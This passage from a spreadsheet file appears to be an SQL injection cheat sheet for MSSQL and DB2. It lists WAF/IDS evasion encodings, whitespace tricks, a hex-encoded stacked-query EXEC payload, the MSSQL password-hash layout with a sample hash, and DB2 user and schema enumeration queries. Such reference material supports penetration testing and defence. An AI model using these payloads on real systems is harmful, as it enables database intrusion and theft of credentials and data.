          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro26">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Whitespaces</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>01 Start of Heading</text:p>
            <text:p>02 Start of Text</text:p>
            <text:p>03 End of Text</text:p>
            <text:p>04 End of Transmission</text:p>
            <text:p>05 Enquiry</text:p>
            <text:p>06 Acknowledge</text:p>
            <text:p>07 Bell</text:p>
            <text:p>08 Backspace</text:p>
            <text:p>09 Horizontal Tab</text:p>
            <text:p>0A New Line</text:p>
            <text:p>0B Vertical Tab</text:p>
            <text:p>0C New Page</text:p>
            <text:p>0D Carriage Return</text:p>
            <text:p>0E Shift Out</text:p>
            <text:p>0F Shift In</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro27">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Whitespaces continued</text:p>
            <text:p> The percentage signs in between keywords is only possible on ASP(x) web applications. </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">10 Data Link Escape</text:span></text:p>
            <text:p><text:span text:style-name="T3">11 Device Control 1</text:span></text:p>
            <text:p><text:span text:style-name="T3">12 Device Control 2</text:span></text:p>
            <text:p><text:span text:style-name="T3">13 Device Control 3</text:span></text:p>
            <text:p><text:span text:style-name="T3">14 Device Control 4</text:span></text:p>
            <text:p><text:span text:style-name="T3">15 Negative Acknowledge</text:span></text:p>
            <text:p><text:span text:style-name="T3">16 Synchronous Idle</text:span></text:p>
            <text:p><text:span text:style-name="T3">17 End of Transmission Block</text:span></text:p>
            <text:p><text:span text:style-name="T3">18 Cancel</text:span></text:p>
            <text:p><text:span text:style-name="T3">19 End of Medium</text:span></text:p>
            <text:p><text:span text:style-name="T3">1A Substitute</text:span></text:p>
            <text:p><text:span text:style-name="T3">1B Escape</text:span></text:p>
            <text:p><text:span text:style-name="T3">1C File Separator</text:span></text:p>
            <text:p><text:span text:style-name="T3">1D Group Separator</text:span></text:p>
            <text:p><text:span text:style-name="T3">1E Record Separator</text:span></text:p>
            <text:p><text:span text:style-name="T3">1F Unit Separator</text:span></text:p>
            <text:p><text:span text:style-name="T3">20 Space</text:span></text:p>
            <text:p><text:span text:style-name="T3">25 %</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoid the use of spaces</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>22 "</text:p>
            <text:p>28 (</text:p>
            <text:p>29 )</text:p>
            <text:p>5B [</text:p>
            <text:p>5D ]</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Allowed Intermediary Characters after AND/OR</text:p>
            <text:p>  The backslash does not seem to work with MSSQL 2000. </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>01 - 20 Range</text:p>
            <text:p>21 !</text:p>
            <text:p>2B +</text:p>
            <text:p>2D -</text:p>
            <text:p>2E .</text:p>
            <text:p>5C \</text:p>
            <text:p>7E ~</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Encoding your injection can sometimes be useful for WAF/IDS evasion. </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>URL Encoding SELECT %74able_%6eame FROM information_schema.tables;</text:p>
            <text:p>Double URL Encoding SELECT %2574able_%256eame FROM information_schema.tables;</text:p>
            <text:p>Unicode Encoding SELECT %u0074able_%u6eame FROM information_schema.tables;</text:p>
            <text:p>Invalid Hex Encoding (ASP) SELECT %tab%le_%na%me FROM information_schema.tables;</text:p>
            <text:p>Hex Encoding ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--</text:p>
            <text:p>HTML Entities (Needs to be verified) %26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Hashing</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Passwords begin with 0x0100, the first for bytes following the 0x are a constant; the next eight bytes are the hash salt and the remaining 80 bytes are two hashes, the first 40 bytes are a case-sensitive hash of the password, while the second 40 bytes are the uppercase version.</text:p>
            <text:p>0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <table:table table:name="DB2" table:style-name="ta1">
        <table:table-column table:style-name="co8" table:default-cell-style-name="ce4"/>
        <table:table-column table:style-name="co9" table:default-cell-style-name="ce4"/>
        <table:table-row table:style-name="ro28">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2">Select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo</text:span></text:p>
            <text:p><text:span text:style-name="T2">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29">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2">Select system_user from sysibm.sysdummy1</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">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2">Select grantee from syscat.dbauth — incomplete results</text:span></text:p>
            <text:p><text:span text:style-name="T2">Select distinct(definer) from syscat.schemata — more accurate</text:span></text:p>
            <text:p><text:span text:style-name="T2">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29">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30">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30">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30">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30">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30">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30">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30">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30">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30">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31">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32">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
            <text:p><text:span text:style-name="T2">Select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) — Same but without repeated elements</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T2">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30">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30">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33">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29">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4">00/00/0000</text:date>, <text:time style:data-style-name="N2" text:time-value="10:15:01.325685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10-14T18:07:54.158046546</dc:date>
    <meta:editing-duration>PT13H39M57S</meta:editing-duration>
    <meta:editing-cycles>31</meta:editing-cycles>
    <meta:generator>LibreOffice/6.1.2.1$Linux_X86_64 LibreOffice_project/10$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="4" meta:cell-count="879" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>